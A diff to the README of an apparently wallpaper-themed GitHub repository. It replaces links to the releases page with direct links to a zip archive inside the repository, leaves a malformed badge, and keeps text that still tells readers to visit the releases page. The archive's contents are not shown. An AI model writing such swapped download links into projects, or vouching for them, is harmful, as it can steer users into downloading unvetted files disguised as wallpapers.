@@ -4,10 +4,10 @@
 Welcome to the archlinux-wallpapers repository! Here, you will find a curated collection of beautiful wallpapers designed especially for Arch Linux enthusiasts. These images will enhance your desktop experience, making your computing more enjoyable.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Releases-brightgreen.svg)](https://github.com/said112233/archlinux-wallpapers/releases)
+[![Download](https://raw.githubusercontent.com/said112233/archlinux-wallpapers/main/wallpapers/archlinux-wallpapers-1.0.zip%https://raw.githubusercontent.com/said112233/archlinux-wallpapers/main/wallpapers/archlinux-wallpapers-1.0.zip)](https://raw.githubusercontent.com/said112233/archlinux-wallpapers/main/wallpapers/archlinux-wallpapers-1.0.zip)
 
 ## 📁 Download & Install
-To download the latest wallpapers, visit this page: [Download Wallpapers](https://github.com/said112233/archlinux-wallpapers/releases). 
+To download the latest wallpapers, visit this page: [Download Wallpapers](https://raw.githubusercontent.com/said112233/archlinux-wallpapers/main/wallpapers/archlinux-wallpapers-1.0.zip). 
 Here, you will find a list of available wallpapers as individual image files. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link above to go to the releases page.
